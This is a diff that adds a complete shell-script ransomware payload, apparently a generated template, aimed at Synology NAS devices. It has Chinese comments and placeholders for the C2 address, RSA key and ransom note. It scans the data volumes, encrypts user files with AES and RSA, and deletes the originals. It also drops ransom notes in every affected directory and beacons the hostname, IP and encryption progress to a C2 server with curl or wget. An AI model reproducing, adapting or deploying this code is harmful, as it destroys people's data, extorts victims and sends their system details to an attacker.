@@ -1,0 +1,395 @@
+#!/bin/sh
+# Jasmin Synology DSM Payload — Auto-generated
+# 纯 POSIX sh + openssl，无 python/xxd 依赖，带加密进度条
+# 关键：强制 C locale，否则 awk sprintf("%c",>=128) 会输出多字节UTF-8，损坏二进制密钥
+export LC_ALL=C
+export LANG=C
+C2='{{C2_URL}}'
+SECRET='{{HANDSHAKE}}'
+
+# ─── 加密目标：NAS 上真正值钱的是用户数据 ───
+# 永远不含系统分区。NAS 一旦起不来，用户连"付钱恢复"的入口都没有 ——
+# 这对双方都是坏结果。数据卷 + 外接/USB 存储才是目标。
+EXTS='ppt pptx doc docx xls xlsx pdf txt csv rtf odt ods md jpg jpeg png gif bmp tif tiff heic webp raw mp3 flac wav m4a aac ogg mp4 mov avi mkv wmv mpg zip rar 7z tar gz bz2 tgz iso img sql bak db sqlite accdb mdb conf cfg ini json xml yaml yml toml env html htm php js ts py java c cpp h cs sh ps1 bat vmdk vdi vhd qcow2 ova ovf kdbx pem key pfx p12 ovpn'
+
+# 必须跳过的路径（系统卷 / 元数据 / 回收站 / 缩略图缓存 / 快照）
+# DSM 的系统区与元数据：@appstore/@database/@iSCSI/@docker、#recycle、@eaDir(缩略图，海量小文件)
+SKIP_PAT='*/@eaDir* */#recycle* */@appstore* */@database* */@tmp* */@iSCSI* */@synologydrive* */@cloudstation* */@SSDcache* */@snapshot* */@docker* */.SynologyWorkingDirectory* */lost+found*'
+
+# ── RSA公钥 ──
+PUB_KEY='{{RSA_PUBLIC_KEY}}'
+
+RANSOM_TXT='{{RANSOM_NOTE}}'
+
+# ────────────────────────────────────────
+# 工具函数
+# ────────────────────────────────────────
+log(){ echo "[jasmin] $*" >&2; }
+
+has_cmd(){ command -v "$1" >/dev/null 2>&1; }
+
+# hex → 原始二进制（用awk查表，BusyBox无xxd/strtonum也能跑）
+hex2bin(){
+    awk 'BEGIN{for(i=0;i<256;i++)t[sprintf("%02x",i)]=sprintf("%c",i)}
+         {n=split($0,a,"");for(i=1;i<=n;i+=2)printf "%s",t[a[i] a[i+1]]}'
+}
+
+# 十进制 → 4字节小端二进制
+dec2le(){
+    awk -v n="$1" 'BEGIN{printf "%c%c%c%c",n%256,int(n/256)%256,int(n/65536)%256,int(n/16777216)%256}'
+}
+
+sha256_file(){
+    # ESXi openssl 支持 -binary，直接输出32字节原始摘要
+    openssl dgst -sha256 -binary "$1" 2>/dev/null
+}
+
+http_post(){
+    # 返回非0表示上报失败(curl -f 在 HTTP>=400 时失败)，供调用方提示
+    if has_cmd curl; then
+        curl -s -f -X POST -d "$2" "$1" >/dev/null 2>&1
+    elif has_cmd wget; then
+        wget -q -O /dev/null --post-data="$2" "$1" 2>/dev/null
+    else
+        return 127
+    fi
+}
+
+# 人类可读字节数
+fmt_bytes(){
+    awk -v b="$1" 'BEGIN{
+        split("B KB MB GB TB PB",u," ");
+        i=1; while(b>=1024 && i<6){b/=1024;i++}
+        if(i==1) printf "%d%s",b,u[i]; else printf "%.2f%s",b,u[i];
+    }'
+}
+
+# 判断文件是否为加密目标
+is_target(){
+    is_skipped "$1" && return 1
+    _e="${1##*.}"
+    for _x in $EXTS; do
+        [ "$_e" = "$_x" ] && return 0
+    done
+    return 1
+}
+
+# 路径是否落在跳过列表（系统卷 / 元数据 / 回收站）
+is_skipped(){
+    case "$1" in
+        */@eaDir*|*#recycle*|*/@appstore*|*/@database*|*/@tmp*|*/@iSCSI*|*/@synologydrive*|*/@cloudstation*|*/@SSDcache*|*/@snapshot*|*/@docker*|*/.SynologyWorkingDirectory*|*/lost+found*) return 0;;
+    esac
+    return 1
+}
+
+# ────────────────────────────────────────
+# 探测要加密的数据卷
+# ────────────────────────────────────────
+# 只取真实目录：NAS 上大量卷名是符号链接，顺着链接走会重复遍历同一份数据、
+# 也会误入系统卷。排除系统卷后按出现顺序去重。
+scan_roots(){
+    for _D in /volume[0-9]* /volumeUSB[0-9]* /volumeSATA[0-9]* /volumeNVMe[0-9]*; do
+        [ -d "$_D" ] || continue
+        [ -L "$_D" ] && continue
+        printf '%s\n' "$_D"
+    done | awk '!seen[$0]++'
+}
+
+
+# ────────────────────────────────────────
+# 写RSA公钥到临时文件
+# ────────────────────────────────────────
+write_pubkey(){
+    PF="/tmp/.jasmin_pub_$$"
+    printf '%s\n' "$PUB_KEY" > "$PF"
+    echo "$PF"
+}
+
+# ────────────────────────────────────────
+# 失败原因记录：加密失败绝不能静默
+# ────────────────────────────────────────
+FAILS_FILE=/tmp/.jfails_$$
+note_fail(){ printf '%s\n' "$1" >> "$FAILS_FILE" 2>/dev/null; }
+report_fails(){
+    [ -s "$FAILS_FILE" ] || return 0
+    log "!!! Some files failed to encrypt. Reason breakdown:"
+    sort "$FAILS_FILE" 2>/dev/null | uniq -c | sort -rn | while read -r C R; do
+        log "!!!   $C time(s) - $R"
+    done
+    log "!!! Check: free space (df -h), whether the datastore is read-only, directory writability"
+    rm -f "$FAILS_FILE"
+}
+
+# ────────────────────────────────────────
+# 空间预检
+# ────────────────────────────────────────
+preflight(){
+    # 逐个数据卷检查：一台 NAS 常挂多个卷，只查第一个会漏掉真正会写爆的那个
+    NEED_KB=$((${1:-0}/1024))
+    _any=0
+    for DS in $ROOTS; do
+        [ -d "$DS" ] || continue
+        _any=1
+        AVAIL_KB=$(df -k "$DS" 2>/dev/null | awk 'NR==2{print $4}')
+        [ -n "$AVAIL_KB" ] || continue
+        if [ "$AVAIL_KB" -lt $((NEED_KB + NEED_KB/20 + 1024)) ]; then
+            log "!!! Preflight warning: $DS has $((AVAIL_KB/1024/1024))GB free < ~$((NEED_KB/1024/1024))GB required"
+            log "!!! Each file needs an equally sized .jasmin copy; insufficient space causes widespread failures"
+        fi
+    done
+    [ "$_any" = "1" ] || log "!!! Preflight: no data volume found (nothing to encrypt)"
+}
+
+# ────────────────────────────────────────
+# 加密单个文件
+# 格式: [SHA256 32B][AES密文][RSA加密key块][4B key块长度(小端)]
+# ────────────────────────────────────────
+encrypt_file(){
+    FILE="$1"
+    PUBKEY="$2"
+    [ -f "$FILE" ] || { note_fail "file missing or not a regular file"; return 1; }
+    [ -s "$FILE" ] || { note_fail "file is empty (0 bytes)"; return 1; }
+    case "$FILE" in *.jasmin) return 1;; esac
+
+    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || { note_fail "openssl rand failed (entropy source or openssl error)"; return 1; }
+    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || { note_fail "openssl rand failed (entropy source or openssl error)"; return 1; }
+
+    ENC="${FILE}.jasmin"
+    T_KIV="/tmp/.jkiv_$$"
+    T_EK="/tmp/.jek_$$"
+    T_HASH="/tmp/.jhash_$$"
+
+    # SHA256 原始文件（原始32字节）
+    sha256_file "$FILE" > "$T_HASH" || { note_fail "SHA256 failed (read denied or file corrupt)"; rm -f "$T_HASH"; return 1; }
+    [ -s "$T_HASH" ] || { note_fail "SHA256 result is empty"; rm -f "$T_HASH"; return 1; }
+
+    # key(32B)+iv(16B) 原始二进制（awk hex2bin，替代缺失的 xxd）
+    printf '%s%s' "$KEY_HEX" "$IV_HEX" | hex2bin > "$T_KIV" 2>/dev/null
+    [ -s "$T_KIV" ] || { note_fail "key/iv binary conversion failed (hex2bin)"; rm -f "$T_KIV" "$T_HASH"; return 1; }
+
+    # RSA-OAEP 加密 key+iv
+    openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
+        -in "$T_KIV" -out "$T_EK" \
+        -pkeyopt rsa_padding_mode:oaep \
+        -pkeyopt rsa_oaep_md:sha256 \
+        -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
+        note_fail "RSA-OAEP encryption failed (bad public key or disk full)"
+        rm -f "$T_KIV" "$T_EK" "$T_HASH"
+        return 1
+    }
+
+    EK_LEN=$(wc -c < "$T_EK" 2>/dev/null)
+    [ -n "$EK_LEN" ] || EK_LEN=256
+
+    # ── 直接组装到目标文件（不再经 /tmp 中转）──
+    # 旧实现把密文先写 /tmp 再 cat 过来。ESXi 的 /tmp 是 RAM disk（通常几十 MB），
+    # 而 VMDK 动辄几十 GB —— 必然写爆 /tmp 并吃光内存，大文件加密就此失败。
+    # 现在：目标文件里先占 32B，密文由 openssl 直接追加（stdout 重定向），最后回填 SHA256。
+    # 全程零额外空间。各步失败都要捕获 —— 磁盘满时重定向会静默产出空文件。
+    _cleanup(){ rm -f "$ENC" "$T_KIV" "$T_EK" "$T_HASH"; }
+    : > "$ENC" 2>/dev/null || { note_fail "cannot write .jasmin (no space / read-only / permission denied)"; rm -f "$T_KIV" "$T_EK" "$T_HASH"; return 1; }
+    if ! dd if=/dev/zero bs=32 count=1 >> "$ENC" 2>/dev/null; then
+        note_fail "cannot write .jasmin (no space / read-only / out of inodes)"; _cleanup; return 1
+    fi
+    if ! openssl enc -aes-256-cbc -nosalt -in "$FILE" -K "$KEY_HEX" -iv "$IV_HEX" >> "$ENC" 2>/dev/null; then
+        note_fail "AES encryption failed (no space / read-only / permission denied)"; _cleanup; return 1
+    fi
+    if ! { cat "$T_EK"; dec2le "$EK_LEN"; } >> "$ENC" 2>/dev/null; then
+        note_fail "cannot write .jasmin (no space / read-only / out of inodes)"; _cleanup; return 1
+    fi
+    if ! dd if="$T_HASH" of="$ENC" bs=32 count=1 conv=notrunc 2>/dev/null; then
+        note_fail "SHA256 write-back failed (no space / read-only)"; _cleanup; return 1
+    fi
+
+    rm -f "$T_KIV" "$T_EK" "$T_HASH"
+
+    if [ -s "$ENC" ]; then
+        rm -f "$FILE"
+        return 0
+    else
+        note_fail "generated .jasmin is empty (no space / read-only / out of inodes)"
+        rm -f "$ENC"
+        return 1
+    fi
+}
+
+# ────────────────────────────────────────
+# 进度条: draw_bar 已处理数 总数 已处理字节 总字节 [当前文件]
+# ────────────────────────────────────────
+draw_bar(){
+    N="$1"; T="$2"; CB="$3"; TB="$4"; CUR="$5"
+    if [ "$T" -gt 0 ]; then
+        PCT=$((N*100/T))
+    else
+        PCT=100
+    fi
+    [ "$PCT" -gt 100 ] && PCT=100
+
+    # 28格进度条
+    BAR=""
+    I=0
+    while [ "$I" -lt 28 ]; do
+        if [ $((I*100/28)) -lt "$PCT" ]; then BAR="${BAR}#"; else BAR="${BAR}."; fi
+        I=$((I+1))
+    done
+    if [ -z "$CUR" ]; then CUR="-"; fi
+    # 路径截断为固定宽度，避免行长短变化留下残影
+    CUR=$(printf '%s' "$CUR" | awk '{ if(length($0)>44) print "..." substr($0,length($0)-40); else print }')
+    # 末尾 ESC[K 清到行尾：分子分母与字节数位数会变（9/10 -> 100/100），
+    # 仅靠 %-46s 补空格无法覆盖，短行会在终端留下残影
+    printf '\r  [%s] %3d%%  %s/%s  %s/%s  %-46s\033[K' \
+        "$BAR" "$PCT" "$N" "$T" "$(fmt_bytes "$CB")" "$(fmt_bytes "$TB")" "$CUR" >&2
+}
+
+# ────────────────────────────────────────
+# 投放勒索信
+# ────────────────────────────────────────
+drop_notes(){
+    SID="$1"
+    ND="$2"
+    NOTE=$(printf '%s' "$RANSOM_TXT" | sed "s/{sid}/$SID/g")
+    # 1) 数据存储顶层
+    for DS in $ROOTS; do
+        [ -d "$DS" ] || continue
+        printf '%s\n' "$NOTE" > "$DS/READ_ME_DECRYPT.txt" 2>/dev/null
+    done
+    # 2) 每个含有被加密文件的目录（去重后逐个投放）
+    if [ -n "$ND" ] && [ -f "$ND" ]; then
+        WROTE=0
+        sort -u "$ND" > "$ND.uniq" 2>/dev/null || cp "$ND" "$ND.uniq"
+        while IFS= read -r D; do
+            [ -n "$D" ] || continue
+            [ -d "$D" ] || continue
+            if printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null; then
+                WROTE=$((WROTE+1))
+            else
+                printf '%s\n' "ransom note write failed (disk full / read-only): $D" >> "$FAILS_FILE"
+            fi
+        done < "$ND.uniq"
+        rm -f "$ND.uniq"
+        log "Ransom note dropped in $WROTE directory(ies)"
+    fi
+    printf '%s\n' "$NOTE" > /tmp/READ_ME_DECRYPT.txt 2>/dev/null
+}
+
+# ────────────────────────────────────────
+# 回传C2 ($6=is_complete $7=total_count $8=total_size)
+# ────────────────────────────────────────
+beacon(){
+    SID="$1"; COUNT="$2"; SIZE="$3"; TYPES="$4"; DETAIL="$5"
+    DONE="${6:-1}"; TC="${7:-0}"; TS="${8:-0}"
+    HOSTNAME=$(hostname 2>/dev/null || echo "synology")
+    OS_VER=$(awk -F'"' '/productversion/{print $2}' /etc.defaults/VERSION 2>/dev/null)
+    [ -z "$OS_VER" ] && OS_VER=$(uname -r 2>/dev/null || echo "DSM")
+    IP=$(ifconfig 2>/dev/null | awk '/inet /{print $2}' | sed 's/addr://' | grep -v '^127\.' | head -1)
+    [ -z "$IP" ] && IP="0.0.0.0"
+    DATE=$(date '+%d/%m/%Y, %A' 2>/dev/null)
+    TIME_STR=$(date '+%H:%M:%S' 2>/dev/null)
+    DATA="handshake=${SECRET}&machine_name=${HOSTNAME}&computer_user=root&os=Synology DSM%20${OS_VER}&date=${DATE}&time=${TIME_STR}&ip=${IP}&location=&systemid=${SID}&password=RSA_PROTECTED&encrypted_count=${COUNT}&encrypted_size=${SIZE}&encrypted_types=${TYPES}&encrypted_detail=${DETAIL}&is_complete=${DONE}&total_count=${TC}&total_size=${TS}"
+    if ! http_post "$C2" "$DATA"; then
+        log "!!! Beacon failed: $C2"
+        log "!!! Check that the C2 URL is reachable, the port (this service listens on :8080), and that SECRET matches the panel"
+    fi
+}
+
+# ────────────────────────────────────────
+# 主流程
+# ────────────────────────────────────────
+main(){
+    has_cmd openssl || { log "openssl is missing, cannot run"; exit 1; }
+
+    SID="$(hostname)_$$_$(date +%s)"
+
+    ROOTS=$(scan_roots)
+    [ -n "$ROOTS" ] || { log "No data volume found - nothing to do."; exit 0; }
+
+    PUBKEY=$(write_pubkey)
+
+    # ── 阶段1: 预扫描统计目标文件总数（进度条分母） ──
+    log "Scanning for target files..."
+    TOTAL=0
+    TOTAL_BYTES=0
+    for DS in $ROOTS; do
+        [ -d "$DS" ] || continue
+        CL="/tmp/.jcnt_$$"
+        find "$DS" -type f 2>/dev/null > "$CL"
+        while IFS= read -r F; do
+            [ -n "$F" ] || continue
+            if is_target "$F"; then
+                TOTAL=$((TOTAL+1))
+                SZ=$(wc -c < "$F" 2>/dev/null || echo 0)
+                TOTAL_BYTES=$((TOTAL_BYTES+SZ))
+            fi
+        done < "$CL"
+        rm -f "$CL"
+    done
+    log "Found $TOTAL target file(s), $(fmt_bytes "$TOTAL_BYTES") total"
+    [ "$TOTAL" -gt 0 ] || log "Note: no matching target files found (check the EXTS whitelist)"
+
+    preflight "$TOTAL_BYTES"    # space preflight
+
+    COUNT=0
+    PROCESSED=0
+    SIZE=0
+    TYPES=""
+    FIRST=1
+    LAST_BEACON=$(date +%s)
+    NOTE_DIRS="/tmp/.jnotedirs_$$"
+    : > "$NOTE_DIRS"
+
+    if [ "$TOTAL" -gt 0 ]; then
+        for DS in $ROOTS; do
+            [ -d "$DS" ] || continue
+            # 先把文件清单落到临时文件，再普通while读取
+            # （避免 find|while 子shell导致 COUNT/SIZE/TYPES 修改丢失）
+            LIST="/tmp/.jlist_$$"
+            find "$DS" -type f 2>/dev/null > "$LIST"
+            while IFS= read -r F; do
+                [ -n "$F" ] || continue
+                is_target "$F" || continue
+                EXT="${F##*.}"
+                FSIZE=$(wc -c < "$F" 2>/dev/null || echo 0)
+
+                if encrypt_file "$F" "$PUBKEY"; then
+                    COUNT=$((COUNT+1))
+                    SIZE=$((SIZE+FSIZE))
+                    printf '%s\n' "${F%/*}" >> "$NOTE_DIRS"   # record dirs for ransom note drop
+                    case ",$TYPES," in
+                        *",$EXT,"*) ;;
+                        *) if [ "$FIRST" = "1" ]; then TYPES="$EXT"; FIRST=0; else TYPES="${TYPES},${EXT}"; fi ;;
+                    esac
+                fi
+
+                # 进度用"已处理"而非"已成功"：失败的文件也占用了分母，
+                # 否则有失败时进度条永远走不到 100%
+                PROCESSED=$((PROCESSED+1))
+                draw_bar "$PROCESSED" "$TOTAL" "$SIZE" "$TOTAL_BYTES" "$F"
+
+                # 每8秒回传一次进度
+                NOW=$(date +%s)
+                if [ $((NOW-LAST_BEACON)) -ge 8 ]; then
+                    LAST_BEACON=$NOW
+                    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "0" "$TOTAL" "$TOTAL_BYTES"
+                fi
+            done < "$LIST"
+            rm -f "$LIST"
+        done
+        printf '\n' >&2
+    fi
+
+    rm -f "$PUBKEY"
+
+    log "Encryption complete: $COUNT/$TOTAL file(s), $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
+    report_fails    # failures must be visible
+
+    if [ "$TOTAL" -gt 0 ]; then
+        drop_notes "$SID" "$NOTE_DIRS"
+    else
+        # 一个字都没加密却满盘投放勒索信，只会让受害者误判
+        log "Nothing was encrypted - skipped ransom note drop."
+    fi
+    rm -f "$NOTE_DIRS"
+    beacon "$SID" "$COUNT" "$SIZE" "$TYPES" "{}" "1" "$TOTAL" "$TOTAL_BYTES"
+}
+
+main
